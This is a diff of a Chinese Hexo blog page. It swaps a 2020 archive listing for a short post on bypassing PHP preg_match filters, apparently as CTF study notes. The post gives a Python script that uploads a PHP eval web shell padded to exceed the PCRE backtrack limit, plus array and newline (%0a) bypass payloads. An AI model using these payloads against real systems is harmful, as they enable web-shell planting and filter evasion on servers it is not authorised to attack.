@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020 | 一颗小柠檬</title>
+  <title>preg-match绕过 | 一颗小柠檬</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="一颗小柠檬">
-<meta property="og:url" content="http://yoursite.com/archives/2020/page/2/index.html">
+  <meta name="description" content="PHP preg_match() 函数作用preg_match 函数用于执行一个正则表达式匹配。 语法int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )搜索 subject 与 pattern 给定的正则表达式的一个匹">
+<meta property="og:type" content="article">
+<meta property="og:title" content="preg-match绕过">
+<meta property="og:url" content="http://yoursite.com/2020/09/05/preg-match%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="一颗小柠檬">
+<meta property="og:description" content="PHP preg_match() 函数作用preg_match 函数用于执行一个正则表达式匹配。 语法int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )搜索 subject 与 pattern 给定的正则表达式的一个匹">
 <meta property="og:locale" content="cn">
+<meta property="article:published_time" content="2020-09-05T15:09:29.502Z">
+<meta property="article:modified_time" content="2020-09-05T15:25:14.998Z">
 <meta property="article:author" content="Seamiloak">
 <meta name="twitter:card" content="summary">
   
@@ -187,346 +191,242 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-preg-match绕过" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/08/08/buuctf-web/" class="archive-article-date">
-        <time datetime="2020-08-08T15:47:27.473Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-08</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/08/08/buuctf-web/" target="_blank">buuctf-web</a>
   
+    <h1 class="article-title" itemprop="name">
+      preg-match绕过
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/" class="archive-article-date">
-        <time datetime="2020-08-04T06:25:50.083Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-04</time>
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2020/09/05/preg-match%E7%BB%95%E8%BF%87/" class="archive-article-date">
+        <time datetime="2020-09-05T15:09:29.502Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-05</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">585字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">2分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="PHP-preg-match-函数"><a href="#PHP-preg-match-函数" class="headerlink" title="PHP preg_match() 函数"></a>PHP preg_match() 函数</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>preg_match 函数用于执行一个正则表达式匹配。</p>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code><br>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p>
+<a id="more"></a>
+<p><strong>参数说明：</strong><br>$pattern: 要搜索的模式，字符串形式。</p>
+<p>$subject: 输入字符串。</p>
+<p>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</p>
+<p>$flags：flags 可以被设置为以下标记值：<br>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</p>
+<p>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</p>
+<p><strong>返回值</strong><br>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>1、数组绕过</strong><br>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
+<p><strong>2、PCRE回溯次数限制</strong><br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;</span><br><span class="line">  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);&#x2F;&#x2F;&#39; + b&#39;a&#39; * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(&#39;http:&#x2F;&#x2F;170.0.0.1:8080&#x2F;index.php&#39;, files&#x3D;files, allow_redirects&#x3D;False)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure>
+
+<p><code>pcre.backtrack_limit</code> 给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
+<p><strong>3、换行符</strong><br><code>.</code>不会匹配换行符，例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;^.*(flag).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要<br><code>$json=&quot;\nflag&quot;</code></p>
+<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;^flag$&#x2F;&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !&#x3D;&#x3D; &#39;flag&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传入<br><code>?a=flag%0a</code>  </p>
+<!--转自：https://www.cnblogs.com/20175211lyz/p/12198258.html-->
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/" target="_blank">MySQL-show语法</a>
-  
-    </h1>
-  
+      </a>
+    </div>
+    
 
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Seamiloak
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://yoursite.com/2020/09/05/preg-match绕过/" title="preg-match绕过" target="_blank">http://yoursite.com/2020/09/05/preg-match绕过/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/09/05/preg-match%E7%BB%95%E8%BF%87/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2020-08-04T05:43:58.825Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-04</time>
-</a>
 
+
+<nav id="article-nav">
+  
+    <a href="/2020/09/05/web%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          web序列化与反序列化
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/05/ping%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ping注入</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" target="_blank">sql注入-堆叠注入</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/07/30/sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2020-07-30T08:28:53.190Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-30</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/07/30/sql%E6%B3%A8%E5%85%A5/" target="_blank">sql注入</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/07/17/php%20filter%E7%9A%84%E5%BA%94%E7%94%A8/" class="archive-article-date">
-        <time datetime="2020-07-17T07:23:52.688Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-17</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/07/17/php%20filter%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank">php filter的应用</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/07/08/bugku-web/" class="archive-article-date">
-        <time datetime="2020-07-08T15:56:10.518Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/07/08/bugku-web/" target="_blank">bugku-web</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/07/08/%E7%BC%96%E7%A0%81%E5%A4%A7%E5%85%A8/" class="archive-article-date">
-        <time datetime="2020-07-08T11:22:41.348Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/07/08/%E7%BC%96%E7%A0%81%E5%A4%A7%E5%85%A8/" target="_blank">编码大全</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/07/08/TCP-IP%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-        <time datetime="2020-07-08T06:48:48.160Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/07/08/TCP-IP%E5%8D%8F%E8%AE%AE/" target="_blank">TCP-IP协议</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/02/03/C++%E7%9F%A9%E9%98%B5%E5%8A%A0%E6%B3%95/" class="archive-article-date">
-        <time datetime="2020-02-03T05:53:12.776Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-03</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/02/03/C++%E7%9F%A9%E9%98%B5%E5%8A%A0%E6%B3%95/" target="_blank">C++矩阵加法</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/01/29/C++%E6%95%B0%E7%BB%84%E6%9F%A5%E6%89%BE%E5%8F%8A%E6%9B%BF%E6%8D%A2/" class="archive-article-date">
-        <time datetime="2020-01-29T15:33:52.843Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-29</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/01/29/C++%E6%95%B0%E7%BB%84%E6%9F%A5%E6%89%BE%E5%8F%8A%E6%9B%BF%E6%8D%A2/" target="_blank">C++数组查找及替换</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2020/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2020/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2020/page/3/">3</a><a class="extend next" rel="next" href="/archives/2020/page/3/">Next &amp;raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -567,8 +467,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
